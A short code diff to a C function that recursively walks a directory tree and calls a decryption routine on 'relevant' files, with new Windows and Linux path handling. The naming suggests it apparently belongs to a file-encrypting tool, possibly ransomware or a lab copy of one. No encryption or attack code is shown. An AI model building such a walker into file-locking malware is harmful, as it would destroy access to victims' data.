@@ -94,13 +94,13 @@ void go_through_files(char* encryption_path, int verbose) {
             continue;
         }
         strcpy(file_path, encryption_path);
-        strcat(file_path, "/");
+
+        if (!strcmp(os, "win")) strcat(file_path, "\\");
+        else if (!strcmp(os, "linux")) strcat(file_path, "/");
         char* ptr = strcat(file_path, entry->d_name);
 
-        if (opendir(file_path) == NULL) {
-            if (verbose) printf("Found %s\n", file_path);
+        if (opendir(file_path) == NULL && is_file_relevent(entry->d_name))
             decryption(file_path, verbose);
-        } 
         else go_through_files(file_path, verbose);
         free(file_path);
     }
